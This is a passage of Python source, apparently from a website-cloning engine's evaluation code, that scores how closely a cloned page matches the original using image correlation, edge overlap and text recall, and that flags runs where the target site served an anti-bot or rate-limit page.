    苹果类媒体目录里每段视频都叫 large.mp4 / small.webm, 名字索引按基名命中会把
    同页所有视频回补成同一段(airpods 首屏舞者视频变成耳机视频)。只认带内容哈希/
    版本串(含数字的 ≥6 位字母数字段)的长名; 通用名交给回源。"""
    stem = os.path.splitext(name or "")[0]
    if len(stem) < 10:
        return False
    return any(len(t) >= 6 for t in _GENERIC_NAME_RE.findall(stem))

# 瞬时 Playwright 会话错误特征: 与稳定克隆失败不同源, 值得换会话重跑一次
# 环境受阻识别: 目标站对爬虫的风控/限流/人机验证/登录墙。分两种:
#  - 基准页本身就是拦截页(Cloudflare 质询、"访问过于频繁"): 基准都不是真页面, 分数没有意义;
#  - 基准截图正常, 但采集过程中页面被风控脚本整页替换成拦截页(jd 高频跑分后的"内容太火爆"),
#    采集到的 DOM/快照就是拦截页, 两轨都塌(21 分)。
# 两种都不是引擎缺陷, 但混进均分会把引擎能力和环境波动搅在一起, 所以单独标记、不计入均分。
# 只认通用风控话术(各家 WAF/CDN/大站通用), 不按域名特判。
_BLOCK_STRONG = re.compile(
    r"访问(?:过于|太)?频繁|内容太火爆|当前页面异常|网络环境(?:存在)?异常|请求过于频繁|"
    r"安全验证|人机验证|滑动验证|拖动(?:下方)?滑块|请完成(?:下方)?验证|"
    r"Just a moment\.\.\.|Checking (?:if the site connection is secure|your browser)|"
    r"Attention Required|unusual traffic|are you a robot|verify (?:that )?you are (?:a )?human|"
    r"Access Denied|Too Many Requests|Request blocked|Pardon Our Interruption", re.I)
# 弱话术: 正常页面也常见(登录页本身就有"验证码"), 只在采集侧新出现、且整页文字很少时才算
_BLOCK_WEAK = re.compile(r"请稍后(?:再试|重试)|系统繁忙|请(?:先)?登录后|登录后(?:查看|访问)|验证码|切换账号|captcha", re.I)
_BLOCK_MAX_CHARS = 600


def _short_text(text: str) -> str:
    """空白折叠成单空格(英文话术要靠空格匹配); 长度另按去空白计。"""
    return re.sub(r"\s+", " ", text or "").strip()


def _text_len(text: str) -> int:
    return len(text.replace(" ", ""))


def detect_blocked_page(original_text: str, captured_text: str = "") -> str:
    """返回环境受阻原因(空串 = 未受阻)。

    original_text: 基准截图时刻的可见文本; captured_text: 采集/回放出来的页面可见文本。
    """
    orig = _short_text(original_text)
    cap = _short_text(captured_text)
    if orig and _text_len(orig) <= _BLOCK_MAX_CHARS:
        m = _BLOCK_STRONG.search(orig)
        if m:
            return f"基准页即拦截页({m.group(0)})"
    if cap and _text_len(cap) <= _BLOCK_MAX_CHARS and _text_len(cap) * 3 < max(_text_len(orig), 1):
        # 强话术: 采集文本骤缩到拦截页量级即可判(原站局部模块也可能带同样话术, 不要求基准里没有);
        # 弱话术: 必须是采集侧新出现的
        m = _BLOCK_STRONG.search(cap)
        if m:
            return f"采集中途被风控替换({m.group(0)})"
        m = _BLOCK_WEAK.search(cap)
        if m and m.group(0).lower() not in orig.lower():
            return f"采集中途被风控替换({m.group(0)})"
    return ""


class CloneUnresponsive(RuntimeError):
    """克隆页主线程无响应(脚本死循环/Promise 自旋): 后续任何 evaluate 都会永远挂起。"""


class TargetUnreachable(RuntimeError):
    """目标站网络层不可达(DNS/连接/超时): 不是引擎缺陷, 不重试、单独计数。"""


_TRANSIENT_ERROR_MARKS = (
    "Execution context was destroyed",
    "Target closed",
    "Target page, context or browser has been closed",
    "Browser has been closed",
    "Session closed",
    "net::ERR_ABORTED",
    "net::ERR_CONNECTION_RESET",
    "net::ERR_CONNECTION_CLOSED",
    "net::ERR_CONNECTION_REFUSED",
    "net::ERR_TIMED_OUT",
    "net::ERR_EMPTY_RESPONSE",
    "net::ERR_INTERNET_DISCONNECTED",
    "net::ERR_NAME_NOT_RESOLVED",
    "net::ERR_ADDRESS_UNREACHABLE",
    "Timeout 30000ms exceeded",
    "Timeout 45000ms exceeded",
    "Navigation failed because page was aborted",
)

# 克隆页 <base href> 剥离: 相对引用基准统一交由 page_dir 影子落盘机制管理
_BASE_TAG_RE = re.compile(r"<base\b[^>]*>", re.I)

# ---------------------------------------------------------------------------
# 诚实相似度 v2: 块级 NCC + 边缘 IoU + 可见文本召回率
# ---------------------------------------------------------------------------
def _text_tokens(text: str) -> set:
    """CJK 二元组 + 拉丁/数字词, 作为可见内容的指纹。"""
    tokens = set()
    text = text or ""
    cjk = re.findall(r"[\u4e00-\u9fff]", text)
    for i in range(len(cjk) - 1):
        tokens.add(cjk[i] + cjk[i + 1])
    if len(cjk) == 1:
        tokens.add(cjk[0])
    for word in re.findall(r"[A-Za-z0-9_]{2,}", text.lower()):
        tokens.add(word)
    return tokens


# 文本指纹快速签名: 评分只需要 |A|、|B|、|A∩B| 三个计数, 不必物化字符串集合。
#  - CJK 二元组编码为整数 (a<<16)|b(CJK 统一表意文字均在 BMP), 单字页编码为
#    字符码本身(<0x10000, 与二元组码域不相交), numpy 排序去重 + 有序求交;
#  - 拉丁词: 先 str.lower()(与旧口径同序, 保留非 ASCII 小写化产出 ASCII 的
#    边角语义), 再 ASCII 编码(非 ASCII → '?', 非词字符)+ 字节翻译表把非词
#    字符变空格 + bytes.split(), 取长度 ≥2 者 —— 与 findall([A-Za-z0-9_]{2,})
#    的最长连续串语义一致, 但全程 C 层, 无正则回溯。
# 两路词元互不相交(CJK vs ASCII), 计数相加即与旧 set 口径逐值一致。
_WORD_BYTES = frozenset(b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_")
_WORD_TABLE = bytes(c if c in _WORD_BYTES else 32 for c in range(256))


def _token_sig(text: str):
    """返回 (cjk_codes, words): cjk_codes 为有序去重 ndarray, words 为 bytes 集合。"""
    text = text or ""
    words = {w for w in set(text.lower().encode("ascii", "replace").translate(_WORD_TABLE).split())
             if len(w) > 1}
    arr = _np.frombuffer(text.encode("utf-16-le", "surrogatepass"), dtype=_np.uint16)
    cjk = arr[(arr >= 0x4E00) & (arr <= 0x9FFF)].astype(_np.uint32)
    if len(cjk) == 1:
        codes = cjk
    else:
        codes = _np.unique((cjk[:-1] << 16) | cjk[1:])
    return codes, words


def _token_counts(orig_text: str, clone_text: str):
    """(|A|, |B|, |A∩B|) —— 与 _text_tokens 集合口径逐值一致。"""
    if _np is None:
        a, b = _text_tokens(orig_text), _text_tokens(clone_text)
        return len(a), len(b), len(a & b)
    ca, wa = _token_sig(orig_text)
    cb, wb = _token_sig(clone_text)
    inter = len(wa & wb)
    if len(ca) and len(cb):
        inter += len(_np.intersect1d(ca, cb, assume_unique=True))
    return len(ca) + len(wa), len(cb) + len(wb), inter


def text_overlap_score(orig_text: str, clone_text: str) -> float:
    """克隆页对原站可见文本的召回率(0~1)。"""
    n_a, n_b, inter = _token_counts(orig_text, clone_text)
    if not n_a:
        return 1.0 if not n_b else 0.7  # 原站本就无文本(纯图页面)时弱化
    return inter / n_a


def text_f_score(orig_text: str, clone_text: str, beta: float = 2.0) -> tuple:
    """文本 F-beta(默认 F2, 召回权重 4 倍于精确): 返回 (f, recall, precision)。

    旧口径只算召回 —— 克隆页多出的错误/残留文案(兜底壳、报错提示、未隐藏
    的模板)不扣分; F2 让多余内容受罚, 同时缺失内容仍是主要失分项。"""
    return _f_from_counts(*_token_counts(orig_text, clone_text), beta)


def _f_from_counts(n_a: int, n_b: int, inter: int, beta: float = 2.0) -> tuple:
    if not n_a:
        v = 1.0 if not n_b else 0.7
        return v, v, v
    if not n_b:
        return 0.0, 0.0, 0.0
    recall = inter / n_a
    precision = inter / n_b
    if recall == 0 or precision == 0:
        return 0.0, recall, precision
    b2 = beta * beta
    return (1 + b2) * precision * recall / (b2 * precision + recall), recall, precision


SCORE_WIDTH = 512            # 评分画布宽度(等比缩放)
SCORE_SEGMENT = 512          # 纵向分段高度(每段一个 512×512 方块)
SCORE_MAX_HEIGHT = 512 * 12  # 评分覆盖的最大缩放后高度(超长页尾部不计)
SHOT_MAX_TEXTURE = 16000      # 单次 captureScreenshot 高度上限(Chromium GPU 纹理 16384)
LAYOUT_MAP_MAX = 4000         # 版面块图最多采集的块数
LAYOUT_FIX_MAX = 150          # 布局校准单次最多覆盖规则数


def layout_fix_css(orig_map, clone_map, min_dh=3, max_rules=LAYOUT_FIX_MAX):
    """两侧版面块图按结构路径对齐, 对高度不一致的"最深"块生成尺寸覆盖。

    同一路径且横向位置/宽度一致(容差 4px 或 2%)才视作同一块; 只取没有更深的
    失配后代的块(根因所在, 祖先的失配是被它撑出来的)。只处理克隆偏矮(补 min-height):
    偏高块若用 max-height+overflow:hidden 收回, 会把块内真实内容裁掉而分数反升
    (CI vitejs: 框架图标行整行被裁空、评分 +1.6) —— 以藏内容换对齐不可接受。
    返回 (css, 失配块数)。"""
    orig = {e[0]: tuple(e[1:5]) for e in orig_map or []}
    bad = {}
    for e in clone_map or []:
        k, y, h, x, w = e[:5]
        pb = e[5] if len(e) > 5 else 0
        o = orig.get(k)
        if o is None:
            continue
        oy, oh, ox, ow = o
        tol = max(4, 0.02 * ow)
        if abs(x - ox) > tol or abs(w - ow) > tol:
            continue
        if oh - h >= min_dh:
            bad[k] = (oh, h, pb)
    keys = sorted(bad)
    leaves = [k for i, k in enumerate(keys)
              if not (i + 1 < len(keys) and keys[i + 1].startswith(k + ">"))]
    rules = []
    for k in leaves[:max_rules]:
        oh, ch, pb = bad[k]
        rules.append(f"{k}{{min-height:{max(0, oh - pb)}px!important}}")
    return "\n".join(rules), len(leaves)
FIRST_SEGMENT_WEIGHT = 2.0   # 首段(首屏区域)权重


_PRIO_EXT = {
    ".css": 0,
    ".png": 1, ".jpg": 1, ".jpeg": 1, ".gif": 1, ".webp": 1, ".avif": 1, ".svg": 1,
    ".ico": 1, ".bmp": 1, ".mp4": 1, ".webm": 1, ".mp3": 1, ".ogg": 1,
    ".woff2": 3, ".woff": 3, ".ttf": 3, ".otf": 3, ".eot": 3,
    ".js": 4, ".mjs": 4, ".cjs": 4, ".map": 5,
}


_META_CHARSET_RE = re.compile(
    r"""(<meta\b[^>]*?\bcharset\s*=\s*["']?)([\w.:-]+)""", re.I)


def _utf8_charset(html: str) -> str:
    """落盘一律 UTF-8, 页内 charset 声明随之改为 utf-8(含 http-equiv 形式)。
    DOM 序列化已是 Unicode, 保留原站 GBK 声明会让浏览器按 GBK 解码出乱码。"""
    return _META_CHARSET_RE.sub(lambda m: m.group(1) + "utf-8", html)


_STATIC_ATTR_RE = re.compile(
    r'<(?:img|link|source|video|audio|input|image)\b[^>]*?\s(src|href|poster|srcset|data-src)'
    r'\s*=\s*(?:"([^"]*)"|\'([^\']*)\')', re.I)


def _static_refs(html: str, base: str) -> dict:
    """未经采集脚本的 HTML(活体 frame DOM 等)静态提取资源引用, 结构同 COLLECT_ASSETS_JS 结果。

    只取样式与媒体, 不取 <script>: 活体 frame DOM 是固化快照, 它的脚本离线重跑只会再次
    把自己弹回宿主; 且 frame 的框架包混进工作区会污染主页面的模式识别(jd 登录框的
    Vue 包让 React 首页被判成 Vue)。"""
    urls, srcsets, raw_refs, seen = [], [], [], set()

    def _add(raw):
        raw = _html.unescape((raw or "").strip())
        if not raw or raw.startswith(ASSET_SKIP_PREFIXES) or raw.startswith(("#", "javascript:")):
            return
        absolute = _urljoin(base, raw)
        if urlsplit(absolute).path.lower().endswith((".js", ".mjs", ".cjs")):
            return   # modulepreload/preload 的脚本同样不取
        if absolute.startswith(("http://", "https://")) and absolute not in seen:
            seen.add(absolute)
            urls.append(absolute)
            raw_refs.append([raw, absolute])

    for m in _STATIC_ATTR_RE.finditer(html or ""):
        attr, val = m.group(1).lower(), m.group(2) if m.group(2) is not None else m.group(3)
        if attr == "srcset":
            srcsets.append(_html.unescape(val))
        else:
            _add(val)
    for raw, _absolute in parse_css_refs(html or "", base):
        _add(raw)
    return {"urls": urls, "srcsets": srcsets, "rawRefs": raw_refs}


# 第三方广告位(程序化竞价, 每次请求创意都不同): 克隆不可能也不该复现某一次的竞价结果,
# 评分时两侧同一位置统一遮成中灰。只认广告投放的专有标识(GPT 容器/iframe、主流 SSP 域名),
# 站点自有的推广位不在此列。techcrunch 每轮 3~8 分的随机抖动全来自这里
AD_RECTS_JS = r"""() => {
  const out = [], sx = window.scrollX || 0, sy = window.scrollY || 0;
  const AD_SRC = /doubleclick\.net|googlesyndication\.com|adservice\.google|amazon-adsystem\.com|adnxs\.com|taboola\.com|outbrain\.com|criteo\.(?:com|net)|pubmatic\.com|rubiconproject\.com/i;
  const seen = new Set();
  const add = (el) => {
    if (!el || seen.has(el)) return;
    seen.add(el);
    const r = el.getBoundingClientRect();
    if (r.width < 30 || r.height < 30) return;
    out.push([Math.round(r.left + sx), Math.round(r.top + sy), Math.round(r.width), Math.round(r.height)]);
  };
  document.querySelectorAll('iframe').forEach(f => {
    const id = f.id || '', src = f.getAttribute('src') || '';
    if (id.startsWith('google_ads_iframe') || AD_SRC.test(src)) add(f);
  });
  document.querySelectorAll('[id^="div-gpt-ad"], [data-google-query-id]').forEach(add);
  return out.slice(0, 80);
}"""


def _mask_rects(path, rects):
    """按文档坐标把矩形区域涂成中灰(截图宽度即文档宽度, 越界自动裁)。"""
    with Image.open(path) as im:
        im.load()
        out = im.convert("RGB")
    draw = ImageDraw.Draw(out)
    w, h = out.size
    for x, y, rw, rh in rects:
        if y >= h or x >= w:
            continue
        draw.rectangle([max(0, x), max(0, y), min(w, x + rw) - 1, min(h, y + rh) - 1],
                       fill=(128, 128, 128))
    out.save(path)


def _frame_bounced(src: str, final: str, target: str) -> bool:
    """iframe 以顶级页面导航后是否被弹走: 换了主机, 或落回宿主目标页。"""
    a, b = urlsplit(src), urlsplit(final)
    host = lambda u: (u.hostname or "").lower().removeprefix("www.")
    if host(a) != host(b):
        return True
    t = urlsplit(target)
    norm = lambda u: (u.netloc.lower(), u.path.rstrip("/") or "/")
    return norm(b) == norm(t) and norm(a) != norm(t)


def _match_live_frame(src: str, live_frames: dict):
    """按 src 找宿主活体页里的子 frame DOM: 先全等, 再按主机+路径(frame 内可能改了查询串)。"""
    if src in live_frames:
        return live_frames[src]
    a = urlsplit(src)
    for u, html in live_frames.items():
        b = urlsplit(u)
        if (a.hostname or "").lower() == (b.hostname or "").lower() and \
                a.path.rstrip("/") == b.path.rstrip("/"):
            return html
    return None


def _asset_priority(url: str, live=()):
    """下载排队键: (未被活体加载, 类型优先级, URL)。

    活体渲染期浏览器真实加载过的资源最先; 其次 样式→图片/媒体→未知(图片 CDN 常见)
    →字体→脚本。字体排在图片后: 中文站单个 CSS 可声明数百个 @font-face 切片
    (多格式兜底), 若先于图片会吃光条目上限、首屏大图全空。"""
    path = urlsplit(url).path.lower()
    dot = path.rfind(".")
    ext = path[dot:] if dot > path.rfind("/") else ""
    return (0 if url in live else 1, _PRIO_EXT.get(ext, 2), url)


def _fit_width(im, width=SCORE_WIDTH, max_h=SCORE_MAX_HEIGHT):
    w, h = im.size
    nh = max(1, round(h * width / max(w, 1)))
    out = im.resize((width, nh))
    return out.crop((0, 0, width, min(nh, max_h)))


def _pad_to(im, height):
    """补齐到指定高度: 用该图底行平均色填充 —— 缺失区域呈平坦, 被结构通道扣分。"""
    w, h = im.size
    if h >= height:
        return im
    bottom = im.crop((0, h - 1, w, h)).resize((1, 1)).getpixel((0, 0))
    canvas = Image.new(im.mode, (w, height), bottom)
    canvas.paste(im, (0, 0))
    return canvas


def _src_pad_heights(size_a, size_b):
    """同宽两图在原始分辨率上先补到同一高度再缩放: 各自缩放时 round(h*512/w) 的取整
    让两图纵向比例差万分之几, 长页底部错开 1px, 逐块 NCC 对这种亚像素错位极敏感 ——
    内容逐像素相同、克隆只多 5px 的 qwik 被评成 93.2(裁齐后 100.0)。先补齐再缩放,
    相同内容落在相同网格上; 补齐区域与缩放后补齐同为底行均色, 缺失/多余照样失分。"""
    (wa, ha), (wb, hb) = size_a, size_b
    if wa != wb:
        return ha, hb
    h = max(ha, hb)
    return h, h


def _fit_padded(im, pad_h):
    if pad_h and pad_h > im.size[1]:
        im = _pad_to(im, pad_h)
    return _fit_width(im)


def _block_ncc(gray_a, gray_b, size=512, block=32) -> float:
    """块级归一化互相关: 双平坦且相近记 1, 一方有结构一方平坦记 0。

    注意不能用 ImageChops.multiply 计算协方差(那是除以 255 的混合运算),
    必须用原始像素值精确累加。numpy 可用时走向量化(实测 6-7 倍), 语义逐块一致。
    """
    if _np is not None:
        return _block_ncc_np(gray_a, gray_b, size, block)
    return _block_ncc_py(gray_a, gray_b, size, block)


def _block_ncc_np(gray_a, gray_b, size=512, block=32) -> float:
    return _block_ncc_arr(_np.asarray(gray_a, dtype=_np.float64).reshape(size, size),
                          _np.asarray(gray_b, dtype=_np.float64).reshape(size, size), size, block)


def _block_ncc_arr(arr_a, arr_b, size=512, block=32) -> float:
    """_block_ncc_np 的数组版(float64 size×size 视图), 逐块运算与其完全一致。"""
    return _ncc_finish(_ncc_prep(arr_a, size, block), arr_b, size, block)


def _ncc_blocks(arr, size, block):
    grid = size // block
    span = grid * block
    return arr[:span, :span].reshape(grid, block, grid, block).transpose(0, 2, 1, 3) \
              .reshape(grid * grid, block * block)


def _ncc_prep(arr_a, size=512, block=32):
    """NCC 中只依赖 a 图的量(块去均值、均值、方差): 参考图可跨调用复用。"""
    a = _ncc_blocks(arr_a, size, block)
    ma = a.mean(axis=1)
    da = a - ma[:, None]
    return da, ma, (da * da).sum(axis=1)


def _ncc_finish(prep, arr_b, size=512, block=32) -> float:
    da, ma, va = prep
    b = _ncc_blocks(arr_b, size, block)
    mb = b.mean(axis=1)
    db = b - mb[:, None]
    cov = (da * db).sum(axis=1)
    vb = (db * db).sum(axis=1)
    flat_a, flat_b = va < 4.0, vb < 4.0
    with _np.errstate(divide="ignore", invalid="ignore"):
        r = _np.clip(cov / _np.sqrt(va * vb), 0.0, 1.0)
    r = _np.where(flat_a & flat_b, (_np.abs(ma - mb) <= 4.0).astype(_np.float64),
                  _np.where(flat_a | flat_b, 0.0, r))
    w = 1.0 + _np.minimum(_np.sqrt(va), 60.0) / 30.0
    return float((r * w).sum() / max(float(w.sum()), 1e-6))


def _block_ncc_py(gray_a, gray_b, size=512, block=32) -> float:
    grid = size // block
    pa = list(gray_a.tobytes())   # L 模式: 1 字节/像素(getdata 已弃用)
    pb = list(gray_b.tobytes())
    scores, weights = [], []
    for by in range(grid):
        for bx in range(grid):
            x0, y0 = bx * block, by * block
            buf_a, buf_b = [], []
            for y in range(y0, y0 + block):
                base = y * size
                buf_a.extend(pa[base + x0:base + x0 + block])
                buf_b.extend(pb[base + x0:base + x0 + block])
            n = len(buf_a)
            ma = sum(buf_a) / n
            mb = sum(buf_b) / n
            cov = 0.0
            va = 0.0
            vb = 0.0
            for a, b in zip(buf_a, buf_b):
                da = a - ma
                db = b - mb
                cov += da * db
                va += da * da
                vb += db * db
            if va < 4.0 and vb < 4.0:  # 双方均近似平坦(std < 2)
                r = 1.0 if abs(ma - mb) <= 4.0 else 0.0
            elif va < 4.0 or vb < 4.0:  # 一方有结构一方平坦
                r = 0.0
            else:
                r = cov / ((va * vb) ** 0.5)
                r = max(0.0, min(1.0, r))
            # 结构复杂的块权重更高(平坦块信息量低)
            w = 1.0 + min(va ** 0.5, 60.0) / 30.0
            scores.append(r * w)
            weights.append(w)
    return sum(scores) / max(sum(weights), 1e-6)


def _edge_iou(gray_a, gray_b, threshold=24) -> float:
    """边缘图 IoU(含 1px 膨胀容差): 版面结构(边框/文字块/图形轮廓)重合度。"""
    def mask(gray):
        edges = gray.filter(ImageFilter.FIND_EDGES)
        binary = edges.point(lambda p: 255 if p > threshold else 0)
        return binary.filter(ImageFilter.MaxFilter(3))  # 容忍 1px 位移错位
    ma, mb = mask(gray_a), mask(gray_b)
    ha, hb = ma.histogram(), mb.histogram()
    on_a, on_b = sum(ha[1:]), sum(hb[1:])
    if on_a == 0 and on_b == 0:
        return 1.0
    inter = sum(ImageChops.darker(ma, mb).histogram()[1:])
    union = on_a + on_b - inter
    return inter / max(union, 1)


def _seg_f64(arr, k):
    return arr[k * SCORE_SEGMENT:(k + 1) * SCORE_SEGMENT].astype(_np.float64)


def _ncc_prep_segments(arr_a, seg_count) -> list:
    return [_ncc_prep(_seg_f64(arr_a, k), SCORE_SEGMENT) for k in range(seg_count)]


def _ncc_finish_segments(preps, arr_b, lo, hi) -> list:
    return [_ncc_finish(preps[k], _seg_f64(arr_b, k), SCORE_SEGMENT) for k in range(lo, hi)]


_REF_PREP: dict = {}   # (参考图内容 sha1, 画布高) -> 参考图侧评分中间量
_REF_PREP_MAX = 2
_REF_PREP_LOCK = threading.Lock()


def _ref_prep(key, padded_a, seg_count, pool):
    """参考图侧的边缘掩码/边缘像素数/NCC 去均值块: 修复循环中参考图固定, 复用。"""
    ck = (key, seg_count)
    with _REF_PREP_LOCK:
        hit = _REF_PREP.get(ck)
    if hit is not None:
        return hit
    arr_a = _np.asarray(padded_a.convert("L"))
    mask_job = pool.submit(_edge_masks, arr_a, seg_count)
    preps = _ncc_prep_segments(arr_a, seg_count)
    mask = mask_job.result()
    prep = (mask, mask.sum(axis=(1, 2)).tolist(), preps)
    with _REF_PREP_LOCK:
        _REF_PREP[ck] = prep
        while len(_REF_PREP) > _REF_PREP_MAX:
            _REF_PREP.pop(next(iter(_REF_PREP)))
    return prep


def _edge_iou_from(mask_a, on_a, arr_b, seg_count) -> list:
    mb = _edge_masks(arr_b, seg_count)
    on_b = mb.sum(axis=(1, 2)).tolist()
    inter = (mask_a & mb).sum(axis=(1, 2)).tolist()
    out = []
    for a, b, i in zip(on_a, on_b, inter):
        out.append(1.0 if a == 0 and b == 0 else i / max(a + b - i, 1))
    return out


def _edge_masks(arr, seg_count, threshold=24):
    """_edge_iou 中 mask() 的 numpy 向量化版, 全部分段一次算完。

    PIL 的 3×3 卷积(FIND_EDGES: 中心 8、邻域 -1)只算内部像素、1px 外框保留
    原值; MaxFilter(3) 按边缘像素复制扩边。旧版逐段 crop 后各自处理, 这里
    对 (段, 512, 512) 逐段做同样的边界处理, 段边界语义一致。整数核 × 整数像素无舍入, 钳制到
    0..255 后阈值化, 与 PIL 逐像素相同。"""
    g = arr.reshape(seg_count, SCORE_SEGMENT, SCORE_WIDTH)
    p = g.astype(_np.int16)
    h, w = SCORE_SEGMENT - 2, SCORE_WIDTH - 2
    neigh = (p[:, 0:h, 0:w] + p[:, 0:h, 1:w + 1] + p[:, 0:h, 2:w + 2]
             + p[:, 1:h + 1, 0:w] + p[:, 1:h + 1, 2:w + 2]
             + p[:, 2:h + 2, 0:w] + p[:, 2:h + 2, 1:w + 1] + p[:, 2:h + 2, 2:w + 2])
    edge = g > threshold   # 卷积不覆盖的 1px 外框: PIL 保留原像素值
    edge[:, 1:-1, 1:-1] = (8 * p[:, 1:h + 1, 1:w + 1] - neigh) > threshold   # 钳制后 >24 ⇔ 原值 >24
    q = _np.pad(edge, ((0, 0), (1, 1), (1, 1)), mode="edge")
    h, w = SCORE_SEGMENT, SCORE_WIDTH
    rows = q[:, 0:h, :] | q[:, 1:h + 1, :] | q[:, 2:h + 2, :]   # 可分离 3×3 最大值
    return rows[:, :, 0:w] | rows[:, :, 1:w + 1] | rows[:, :, 2:w + 2]


_SCORE_POOL = None
_SCORE_POOL_LOCK = threading.Lock()


def _score_pool():
    """评分内部并行用的小线程池(进程级复用; 调度器多 worker 并发评分时共享)。"""
    global _SCORE_POOL
    if _SCORE_POOL is None:
        with _SCORE_POOL_LOCK:
            if _SCORE_POOL is None:
                _SCORE_POOL = ThreadPoolExecutor(max_workers=4, thread_name_prefix="score")
    return _SCORE_POOL


_FIT_CACHE: "dict" = {}          # sha1(文件字节) -> 512 宽缩放结果(RGB), 插入序 LRU
_FIT_CACHE_MAX = 4
_FIT_CACHE_LOCK = threading.Lock()


def _decode_rgb(data: bytes):
    with Image.open(io.BytesIO(data)) as im:
        im.load()
        return im if im.mode == "RGB" else im.convert("RGB")


_FIT_HINTS: dict = {}   # 路径 -> (大小, mtime_ns): 仅用于决定是否投机解码


def _sha1(data: bytes) -> bytes:
    return hashlib.sha1(data).digest()   # sha1 对大缓冲区释放 GIL, 可与解码并行


def _stat_hint(path, size):
    try:
        return size, os.stat(path).st_mtime_ns
    except OSError:
        return None


def _load_fit_pair(path_a, path_b, prime_calibration=False):
    """两图 → ([512 宽缩放结果 ×2], 参考图内容 sha1, 校准预热任务或 None); 缩放
    结果与 _fit_width(Image.open(p).convert("RGB")) 逐像素一致。

    prime_calibration: 克隆图(path_b)未命中缓存而被整页解码时, 顺带用同一份解码
    结果算出像素校准的网格统计写入 pixel_calibrator 的内容缓存(同一 sha1 键),
    紧随其后的 divergent_cells 直接命中, 省掉对同一张图的二次整页 PNG 解码。
    预热是叶子任务, 结果与校准模块自行解码逐值一致(同一 RGB 图、同一函数)。

    - 内容寻址缓存: 以文件字节 sha1 为键缓存缩放结果。修复循环里原站参考图
      在每轮评分/校准后重评分/保真轨评分中反复出现(每任务 4~8 次), 命中后
      免去整页 PNG 解码 + 重采样; 键是内容哈希, 文件被改写即失效, 不会陈旧;
    - 未命中的图并行解码并各自单次 resize(PIL 的 PNG 解码/重采样在 C 层释放
      GIL; 两图未命中时解码与缩放整体并行);
    - 未见过的文件(路径+大小+mtime 提示)读盘后立即投机解码, 与 sha1 重叠。
    全部池任务都是叶子任务(编排在调用线程), 多个评分并发共享线程池不会死锁。"""
    pool = _score_pool()
    slots, pending = [None, None], []
    # 读盘后立即对"没见过的文件"投机解码, 与 sha1 重叠: 用 (路径, 大小, mtime)
    # 只作提示 —— 是否命中仍以内容哈希为准, 投机解码结果确定且与按需解码相同
    entries = []
    datas = [Path(p).read_bytes() for p in (path_a, path_b)]
    pads = _src_pad_heights(*(pixel_calibrator.image_size_of(d) for d in datas))
    for path, data in zip((path_a, path_b), datas):
        hint = _stat_hint(path, len(data))
        with _FIT_CACHE_LOCK:
            likely_hit = hint is not None and _FIT_HINTS.get(str(path)) == hint
        spec = None if likely_hit else pool.submit(_decode_rgb, data)
        entries.append((path, hint, data, spec, pool.submit(_sha1, data)))
    keys = []
    for i, (path, hint, data, spec, key_job) in enumerate(entries):
        key = key_job.result()
        keys.append(key)
        with _FIT_CACHE_LOCK:
            hit = _FIT_CACHE.get((key, pads[i]))
            if hint is not None:
                _FIT_HINTS[str(path)] = hint
                while len(_FIT_HINTS) > 64:
                    _FIT_HINTS.pop(next(iter(_FIT_HINTS)))
        if hit is not None:
            slots[i] = hit
        else:
            pending.append((i, key, spec or pool.submit(_decode_rgb, data)))
    # 单图缩放走一次 PIL resize(与基线逐值一致)。曾用横/纵分带并行加速这一步,
    # 但 PIL 的 im.resize 会按长宽比在内部自选先横后纵或先纵后横(超长页多为纵优先),
    # 手工两趟硬编码横优先, 8 位中间图取整次序不同 → 长页最多偏 8/通道, 破坏逐值
    # 等价闸门(见 tests/test_perf_equivalence)。不同 Pillow 版本的内部次序与并列
    # 判定各异, 无法稳定复刻, 故这一步保持单次 resize; 跨图解码并行、参考图缓存、
    # 评分/边缘/热力图三路并行等优化均不受影响。
    def _stage(i, key, fut):
        # 整页 RGB 解码结果只在此处经手(不留局部引用, 任务完成即释放几十 MB 缓冲)
        im = fut.result()
        prime = None
        if prime_calibration and i == 1:
            # 原站尺寸只读 PNG 头(校准以原站尺寸为网格基准, 克隆图不同尺寸时缩放对齐)
            prime = pool.submit(pixel_calibrator.prime_grid, key, im,
                                pixel_calibrator.image_size_of(entries[0][2]))
        return i, key, pool.submit(_fit_padded, im, pads[i]), prime

    staged = [_stage(i, key, fut) for i, key, fut in pending]
    prime_job = next((prime for _i, _k, _j, prime in staged if prime is not None), None)
    for i, key, job, _prime in staged:
        slots[i] = job.result()
        with _FIT_CACHE_LOCK:
            _FIT_CACHE.pop((key, pads[i]), None)
            _FIT_CACHE[(key, pads[i])] = slots[i]
            while len(_FIT_CACHE) > _FIT_CACHE_MAX:
                _FIT_CACHE.pop(next(iter(_FIT_CACHE)))
    return slots, (keys[0], pads[0]), prime_job


def _diff_image(ra, rb, y0, y1):
    """热力图 [y0, y1) 行: 逐像素运算, 分带结果拼接与整图一次算完相同。"""
    da, db = ra.crop((0, y0, SCORE_WIDTH, y1)), rb.crop((0, y0, SCORE_WIDTH, y1))
    difference = ImageChops.difference(da, db).convert("L")
    mask = difference.point(_DIFF_MASK_LUT)
    backdrop = db.point(_DIFF_DIM_LUT * 3).convert("RGB")
    red_layer = Image.new("RGB", da.size, (255, 0, 0))
    return Image.composite(red_layer, backdrop, mask)


def _write_diff(ra, rb, view_h, diff_path):
    _save_png_fast(_diff_image(ra, rb, 0, view_h), diff_path)


def _png_chunk(kind: bytes, body: bytes) -> bytes:
    return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body))


def _sub_filtered(img) -> bytes:
    """PNG 扫描行(每行前置滤波类型 1 = Sub: 减左邻像素, bpp=3, uint8 回绕)。"""
    w, h = img.size
    rows = _np.asarray(img, dtype=_np.uint8).reshape(h, w * 3)
    raw = _np.empty((h, w * 3 + 1), dtype=_np.uint8)
    raw[:, 0] = 1
    raw[:, 1:4] = rows[:, :3]
    _np.subtract(rows[:, 3:], rows[:, :-3], out=raw[:, 4:])
    return raw.tobytes()


def _png_bytes(w, h, idat: bytes) -> bytes:
    return (b"\x89PNG\r\n\x1a\n"
            + _png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + _png_chunk(b"IDAT", idat)
            + _png_chunk(b"IEND", b""))


def _save_png_fast(img, path):
    """RGB 热力图快速 PNG 编码: 解码后像素与 PIL 保存逐字节相同, 文件编码不同。

    热力图在评分尾部关键路径上; PIL 默认档位编码 512×3200 噪声图 ~90ms。这里
    numpy 一次性做 Sub 滤波 + zlib 1 档压缩, ~25ms, 体积与 PIL 默认档相当。
